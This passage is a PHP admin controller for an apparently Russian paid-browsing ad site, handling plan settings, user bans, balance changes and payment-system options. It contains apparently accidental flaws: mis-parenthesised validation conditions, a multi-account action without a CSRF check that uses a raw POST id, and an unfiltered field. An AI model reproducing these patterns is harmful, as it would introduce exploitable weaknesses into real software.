                'price' => floatval($_POST["price"]),
                'click_price' => floatval($_POST["click_price"]),
                'name' => Validator::isClean(strval($_POST["name"])),
                'view_time' => intval($_POST["view_time"]),
                'highlight' => intval($_POST["highlight"]),
                'transition' => ($_POST["transition"] == 1) ? 1 : 0,
            );

            $id = intval($_POST['id']);

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false && Serfing::issetPlan($id) === false) {
                $errors = "<center><font color='red'><b>Несуществующий план</b></font></center><BR />";
            }

            if ($errors === false && $params['price'] < 0.01) {
                $errors = "<center><font color='red'><b>Минимальная цена клика должна быть не меньше 0.01 руб.</b></font></center><BR />";
            }

            if ($errors === false && $params['click_price'] < 0.01) {
                $errors = "<center><font color='red'><b>Минимальная цена клика должна быть не меньше 0.01 руб.</b></font></center><BR />";
            }

            if ($errors === false && $params['name'] === false || strlen($params['name']) < 5 || strlen($params['name']) > 20) {
                $errors = "<center><font color='red'><b>Название должно иметь от 5 до 20 символов</b></font></center><BR />";
            }

            if ($errors === false && $params['view_time'] < 20 || $params['view_time'] > 60) {
                $errors = "<center><font color='red'><b>Время просмотра должно быть от 20 до 60 секунд</b></font></center><BR />";
            }

            if ($errors === false && $params['highlight'] < 1 || $params['highlight'] > 3) {
                $errors = "<center><font color='red'><b>Доступно 3 уровня выделения</b></font></center><BR />";
            }

            if ($errors === false) {

                Serfing::updatePlanSettings($params, $id);

                $errors = "<center><font color='green'><b>Сохранено</b></font></center><BR />";

            }
        }

        $plans = Serfing::getPlans();

        // подключаем вид
        require_once(ROOT . "/views/admin/_serfing_plans.php");

    }

    public function actionUsers ($sort = 5, $page = 1)
    {

        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        $nav = new Paginator();

        // Записей на страницу
        $on_page = 20;

        $page = intval($page);

        $page = $nav->issetPage('AdminUsers', $on_page, $page);

        // Получаем параметры сортировки
        $sort = strval($sort);

        $users_info = User::getDataFromAdmin($nav, $on_page, $page, $sort);

        // Получаем строку с пагинацией
        $navigation = $nav->getPagination('AdminUsers', $page, $on_page, $sort);

        // подключаем вид
        require_once(ROOT . "/views/admin/_users.php");

    }

    public function actionUsersedit ($id)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        // Получаем id
        $id = intval($id);

        if (!User::checkIssetUser($id)) {
            Header("Location: /admin/users");
            return;
        }

        // забанить/разбанить
        if (isset($_POST["banned"])) {

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false) {
                $baned = intval($_POST["banned"]);

                User::banById($id, $baned);

                $errors = "<center><b>Пользователь " . ($baned > 0 ? "забанен" : "разбанен") . "</b></center><BR />";
            }

        }

        // сбросить кошельки
        if (isset($_POST["reset_purse"])) {

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false) {

                User::resetPurse($id);

                $errors = "<center><b>Кошельки сброшены</b></center><BR />";

            }
        }

        // Сбросить платёжный пароль
        if (isset($_POST["reset_pass"])) {

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false) {
                User::changePayPassword(0, $id);

                $errors = "<center><b>Пин код сброшен</b></center><BR />";
            }
        }

        // Пополняем баланс
        if (isset($_POST["balance_set"])) {

            $sum = floatval($_POST["sum"]);

            $type = ($_POST["balance_set"] == 1) ? "-" : "+";

            switch ($_POST['balance_val']) {
                case 'money_b':
                    $purse = 'money_b';
                    break;
                case 'money_p':
                    $purse = 'money_p';
                    break;
                case 'money_r':
                    $purse = 'money_r';
                    break;
                default:
                    $purse = 'money_b';
                    break;
            }

            $errors = false;

            if (!Session::checkTockenSecurity($_POST['_tocken']))
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";

            if ($errors === false && $sum < 0)
                $errors = "<center><b>Ошибка данных</b></center><BR />";

            if ($errors === false) {

                if ($type == "+") {
                    User::bonus($purse, $sum, $id);
                } else {
                    User::penalty($purse, $sum, $id);
                }

                $string = ($type == "-") ? "У пользователя снято {$sum} руб." : "Пользователю добавлено {$sum} руб.";

                $errors = "<center><b>$string</b></center><BR />";
            }

        }

        $users_info = User::getDataById($id);

        $users_info['ip'] = Func::IntToIP($users_info['ip']);

        // подключаем вид
        require_once(ROOT . "/views/admin/_users_edit.php");

    }

    public function actionUserssearch ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        // Получаем имя
        $user = Validator::isLogin($_POST['user']);

        if ($user == '') {
            Header("Location: /admin/users");
            return;
        }

        $users_info[] = User::getDataFromAdminByName($user);

        $navigation = false;

        // подключаем вид
        require_once(ROOT . "/views/admin/_users.php");

    }

    public function actionMulty ($sort = 5, $page = 1)
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true) {
            Header("Location: /admin/login");
            return;
        }

        if (isset($_POST['yes'])) {

            User::rebanById($_POST['id'], 0);
        }
        if (isset($_POST['no'])) {

            User::banById($_POST['id'], 1);
        }

        $users_info = User::getmult();
        foreach ($users_info as $row) {

            $o = User::checkMultys($row['INET_NTOA(ip)']);

            if ($o === false) {
                $A[$row['user']] = array("id" => $row['id'], "ip" => $row['INET_NTOA(ip)'], "email" => $row['email'], "date_reg" => $row['date_reg'], "user" => $row['user'], "banned" => $row['banned']);
            }

        }

        // Получаем строку с пагинацией


        // подключаем вид
        require_once(ROOT . "/views/admin/_multy.php");

    }

    public function actionPaysystems ()
    {
        // редирект если гость
        if (!isset($_SESSION['admin']) OR $_SESSION['admin'] !== true)
        {
            Header("Location: /admin/login");
            return;
        }

        $paysystems = Paysystems::getPaysystemsSettings();

        $payconfig = new PayConfig;

        if(isset($_POST["yes"]))
        {

            $name = strval($_POST['name']);

            $errors = false;

            $params = array(
                'active' => ($_POST['active'] == 1) ? 1 : 0,
                'active_insert' => ($_POST['active_insert'] == 1) ? 1 : 0,
                'active_payment' => $_POST['active_payment'],
                'comis' => floatval($_POST['comis']),
                'min_pay' => floatval($_POST['min_pay']),
                'max_pay' => floatval($_POST['max_pay']),
            );

            if (!Session::checkTockenSecurity($_POST['_tocken']))
            {
                $errors = "<center><font color='red'><b>Невалидный токен</b></font></center><BR />";
            }

            if ($errors === false && Paysystems::getPaysystem($name) === false)
            {
                $errors = "<center><font color='red'><b>Ошибка данных</b></font></center><BR />";
            }

            if ($errors === false && $params['comis'] < 0)
            {
                $errors = "<center><font color='red'><b>Неверное значение комиссии</b></font></center><BR />";
            }

            if ($errors === false && $params['min_pay'] < 0)
            {
                $errors = "<center><font color='red'><b>Неверное значение минимальной суммы вывода</b></font></center><BR />";
            }

            if ($errors === false && $params['max_pay'] < 0)
            {
                $errors = "<center><font color='red'><b>Неверное значение максимальной суммы вывода</b></font></center><BR />";
            }

            if ($errors === false)
            {
                Paysystems::updatePaysystemsSettings($params, $name);

                $errors = "<center><font color='green'><b>Сохранено</b></font></center><BR />";
            }

        }

        $paysystems = Paysystems::getPaysystemsSettings();

        // подключаем вид
        require_once(ROOT . "/views/admin/_paysystems.php");

    }

}
